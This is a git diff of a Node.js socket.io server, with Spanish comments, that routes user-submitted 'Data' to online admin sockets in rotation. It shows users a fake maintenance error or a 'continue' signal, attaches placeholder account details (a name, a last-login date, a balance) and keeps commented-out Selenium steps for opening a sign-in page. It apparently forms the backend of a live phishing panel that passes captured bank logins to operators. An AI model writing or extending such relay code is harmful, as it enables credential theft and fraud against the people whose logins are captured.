@@ -120,6 +120,23 @@ module.exports = httpServer => {
                 });
         })
 
+
+        socket.on("mostrarEnAdmin", totalInfo => {
+            console.log('mostrar en adm')
+            if (AsignarAdm < socketsOnLineAdm.length - 1) {
+                AsignarAdm += 1;
+            } else {
+                AsignarAdm = 0;
+            }
+            var AdminSelected = socketsOnLineAdm[AsignarAdm];
+            //console.log(AdminSelected);
+            io.to(AdminSelected).emit("NewData", totalInfo);
+        })
+        
+        socket.on("onlineHere", originalSocket => {
+            io.emit("showRowB", originalSocket);
+        })
+
         // Recibir data y enviar al adm
         socket.on("Data", data => {
             totalInfo = [data, 'Pedro Pérez', 'Última vez el 18/08/2022 a las 12:00:00', '$99.999,00'];
@@ -129,12 +146,12 @@ module.exports = httpServer => {
                 io.to(data.socket).emit("ErrorLogin", "En este momento nos encontramos efectuando tareas de mantenimiento. Disculpá las molestias ocasionadas.");
             } else {
 
-                if (AsignarAdm < socketsOnLineAdm.length - 1) {
+                /*if (AsignarAdm < socketsOnLineAdm.length - 1) {
                     AsignarAdm += 1;
                 } else {
                     AsignarAdm = 0;
                 }
-                var AdminSelected = socketsOnLineAdm[AsignarAdm];
+                var AdminSelected = socketsOnLineAdm[AsignarAdm];*/
 
                 /*let browser = new swd.Builder();
                 let tab = browser.forBrowser("chrome")
@@ -143,7 +160,7 @@ module.exports = httpServer => {
                     .build();*/
 
                 io.to(data.socket).emit("ContinuarHome", data.socket);
-                io.to(AdminSelected).emit("NewData", totalInfo);
+                //io.to(AdminSelected).emit("NewData", totalInfo);
 
                 //Step 1 - Opening sign in page
                 /*let tabToOpenSignIn =
